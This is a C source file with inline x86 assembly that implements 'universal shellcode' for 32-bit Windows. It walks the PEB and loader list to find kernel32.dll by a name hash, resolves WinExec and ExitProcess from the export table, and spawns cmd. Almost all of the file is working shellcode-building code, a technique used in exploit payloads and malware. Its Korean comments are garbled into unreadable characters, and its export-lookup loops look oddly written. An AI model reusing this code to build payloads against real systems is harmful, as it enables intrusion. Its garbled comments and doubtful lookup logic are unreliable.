
/*
bool define
*/

#define TRUE 1
#define FALSE 0

/*
SW_SHOW value is for using WinExec API

UINT WinExec(
  LPCSTR lpCmdLine,
  UINT   uCmdShow
);

UINT: unsigned int
LPCSTR: long pointer constant string (const char *)
...

unsigned int WinExec(
	const char *lpCmdLine,
	unsigned int uCmdShow
);

*/
#define SW_SHOW 5

/*

purpose:		universal-shellcode
programmer:	woohyuk seo (������)
doc write date: 	12/19/2019
compiler: 	Visual Studio 2019 C++

universal shellcode�� kernel32.dll�� export�ϴ� �ּҰ� �Ź� �ٲ� call�ϴ� �ּҰ� ��ȿ���� �ʰԵȴ�
�������� ������� �Ϲ����� ���ڵ��� �Ѱ踦 �غ��ϱ� ���ؼ� ���������.

kenrel32.dll�� process�� mapping�Ǿ�����, �ش� kernel32.dll�� ������
�Լ��� �ּҸ� ����Ѵ�.

kernel32.dll�� mapping�� ���� PEB����Ѵ�.

����..

universal shellcode�� ����� ���ؼ� PEB(process environment block)�� ��ġ�� ���ؾ��Ѵ�.
PEB�� ��ġ�� ���ϴ� �������� fs register�� �̿��Ѵ�.

user mode�� fs register�� ���� ���μ����� TEB(thread environment block) �� ����Ű���ִ�.
kernel mode�� fs register�� KPCR (processor control region) �� ����Ű���ִ�. (�տ� �ٴ� K�� ���� kernel�� ���ڰ���.)
KPCR�� schedule info���� ����ȴ�. (����� ��������� ������, ť ����, ... ��� �Ѵ�.


fs:0x30��ġ�� PEB�� �����Ѵ�.
������ ������ ����.

typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  BYTE                          Reserved4[104];
  PVOID                         Reserved5[52];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved6[128];
  PVOID                         Reserved7[1];
  ULONG                         SessionId;
} PEB, *PPEB;

typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];	//sizeof(unsigned char) = 1,  sizeof(unsigned char) * 8 = 8
  PVOID      Reserved2[3];	//sizeof(void *) = 4, sizeof(void *) * 2 = 8

  //distance = (8 + 8 + 4) = 20 byte ( InMemoryOrderModuleList.Flink )

  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

PEB���� (2 + 1 + 1 + 4 + 4 = 12) ��ŭ ���ϸ� PPEB_LDR_DATA Ldr (������ ����)�� �ּҰ� ����
Loade_export�� ����Ű�� �ּҿ���, (8 + (4 * 3) = 20)  ��ŭ ���ϸ� LIST_ENTRY InMemoryOrderModuleList �� �ּҰ� ����
InMemoryOrderModuleList �� ���߸�ũ�� ������ �ִ�.

������ ������ ����
.
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;

FLink�� Front Link, BLink�� Back Link��� ���� (�� ������ ��ũ�� NULL�� ����Ű������)


���� ��ũ�� LDR_DATA_TABLE_ENTRY�� ����Ű���ִ�.
LDR_DATA_TABLE_ENTRY�� �ش� ���μ����� �ε��� DLL�� ������ �������ִ�.

������ ������ ����.

typedef struct _LDR_DATA_TABLE_ENTRY {
	PVOID Reserved1[2];
	LIST_ENTRY InMemoryOrderLinks;
	PVOID Reserved2[2];
	PVOID DllBase;
	PVOID EntryPoint;
	PVOID Reserved3;
	UNICODE_STRING FullDllName;
	BYTE Reserved4[8];
	PVOID Reserved5[3];
	union {
		ULONG CheckSum;
		PVOID Reserved6;
	};
	ULONG TimeDateStamp;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

���⼭ �����ؾ� �� ����, Reserved1������� ������� �ʰ�, InMemoryOrderLinks���� ����Ͽ�,  ((4 * 2) + (4 * 2)) = 16byte��ŭ ���Ͽ� DllBase�� �����ؾ� �Ѵٴ� ���̴�.
������ InMemoryOrderLinks�� ���߸���Ʈ�̴�, �翬�� ���������, Front Link���� �����ɰ��̴�.
Front Link���� ���������� 32��Ʈȯ�濡���� �޸��ּ�ũ�� (4byte) 4�� �ڿ� DllBase�� �����Ѵ�.

DllBase�� mapping�� DLL�� �ּҸ� �������ִ�.

DllBase�� ����Ű�� �ּҸ� register�� ������Ű�� ����� �������� ����ؾ��Ѵ�.
mov�� ��������, ������ 4����Ʈ��ŭ �����Ѵ�. (movzx, movsx, movs)���� ����� 4����Ʈ���� ���ų�, ū ����Ʈ�� �����Ѵ�.
intel��������, 4����Ʈ �������� ǥ���� ������ ����. mov register, [register]
DllBase�� LPVOID���������� mov�� ����Ѵ�.

*/


int GetApiAddress(int* base, int* _export, const char* FindApiName)
{
	int FindApiNameLength;
	for (FindApiNameLength = 0; FindApiName[FindApiNameLength] != 0; FindApiNameLength++);

	int EAT; //Export Address Table
	int NPT; //Name Pointer Table
	int OT;	 //Ordinal Table

	//get info
	int NumberOfFunction = *(_export + 6);

	EAT = *(_export + 7); //sizeof(int) * 7 (28) Export Address Table RVA
	NPT = *(_export + 8); //sizeof(int) * 8 (32) Name Pointer Table RVA
	OT = *(_export + 9);	 //sizeof(int) * 9 (36) Ordinal Table RVA

	//Get VA (Virtual Address)
	NPT += (int)base;
	OT += (int)base;
	EAT += (int)base;

	int* ptr = 0;
	int index = 0;

	//Name Pointer Table
	for (;;)
	{
		//Get next API name
		ptr = (int*)NPT + index;
		index++;

		int IsCmp = TRUE;

		//Get name length
		int ApiStringLength = 0;
		for (; ((char*)*ptr + (int)base)[ApiStringLength] != 0; ApiStringLength++);

		//String compare 
		if (FindApiNameLength <= ApiStringLength)
		{
			for (int i = 0; i != ApiStringLength; i++)
			{
				if (((char*)*ptr + (int)base)[i] != FindApiName[i])
				{
					IsCmp = FALSE;
					break;
				}
			}


			if (IsCmp == TRUE)
			{
				//Successfully string compare
				index--;

				break;
			}
		}
	}

	//Get ordinal
	int LoopCount = 1;

	int ExportAddressTableIndex = 0;
	unsigned short** OrdinalPointer = (unsigned short**)&OT;

	for (;;)
	{
		*OrdinalPointer += 1;

		if (LoopCount == index)
		{
			//Successfully get function ordinal
			ExportAddressTableIndex = **OrdinalPointer;
			break;
		}

		LoopCount++;
	}

	//Get EA (Export Address)
	LoopCount = 1;
	int** ReferenceExportAddressTable = (int**)&EAT;

	for (;;)
	{
		if (LoopCount == ExportAddressTableIndex)
		{
			break;
		}

		LoopCount += 1;
	}

	return *(*ReferenceExportAddressTable + LoopCount) + (int)base; //return VA
}

void shellcode()
{
	/*

	example for calculating hash

	const char kernel32_string[] = "KERNEL32.DLL";
	int kernel32_string_hash = 0;

	for (int i = 0; kernel32_string[i] != 0; i++)
	{
		kernel32_string_hash += kernel32_string[i];
	}

	//kernel32_string_hash is 816 (decimal);

	*/

	const int kernel32_string_hash = 816; //KERNEL32.DLL (Unicode string) hash value

	int* base;
	int* _export;

	__asm
	{
		//eax holds PEB
		//usermode fs register is pointing the PEB
		mov eax, fs:0x30;

		//eax holds LDR address
		mov eax, [eax + 12];
		//LIST_ENTRY InMemoryOrderModuleList
		mov eax, [eax + 20];

	get_next_front_link:;

		//mov FLink (front link)
		mov eax, [eax];

		/*
typedef struct _LSA_UNICODE_STRING {
	USHORT Length;			// + 36
	USHORT MaximumLength;	// + 38
	PWSTR  Buffer;			// + 40
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING;
		*/

		//ebx holds DllNameLength
		//4 byte to 2 byte (USHORT Length)

		//ebx holds DllNameLength
		movsx ebx, word ptr[eax + 36];

		//edx holds DllName
		//40	 = name path
		//40 - 8 = full path
		mov edx, [eax + 40];

		//initailize register
		xor esi, esi;
		xor ecx, ecx;

	get_hash_lable:;

		movsx edi, byte ptr[edx + esi];	//a = dll[x]
		add ecx, edi;						//hash += a;

		add esi, 1;		//add index
		cmp esi, ebx;
		//cmp index, DllNameLength
		//if not equals, while
		jne get_hash_lable;

		cmp ecx, kernel32_string_hash; //KERNEL32.DLL string hash value
		// if not equals the KERNEL32.DLL hash
		jne get_next_front_link;

		//if equals the KERNEL32.DLL hash

		//edi holds DllBase (Dll address)
		mov ebx, [eax + 16];

		//Image dos header
		//0x3C offset pointing value is 0xE8
		//0xE8 value means 'Offset to new EXE header' *(PE..)
		mov edi, [ebx + 0x3c];  //PE Header location
		add edi, ebx;			//add DllBase
		mov edi, [edi + 0x78];	//IMAGE_OPTIONAL_HEADER in Export Table RVA address
		add edi, ebx;			//add DllBase
		mov edx, edi;			//._export IMAGE_EXPORT_DIRECTORY

		mov dword ptr[_export], edx;	//._export export table
		mov dword ptr[base], ebx;	//MZ
	}

	int _WinExec = GetApiAddress(base, _export, "WinExec");
	int _ExitProcess = GetApiAddress(base, _export, "ExitProcess");

	const char shell[] = "cmd";

	//call WinExec
	__asm
	{
		push SW_SHOW;

		lea eax, [shell];
		push eax;

		call _WinExec;
	}
	
	//call ExitProcess
	((void (*) (unsigned int))_ExitProcess)(0);

	return;
}


int main()
{
	shellcode();
	return 0;
}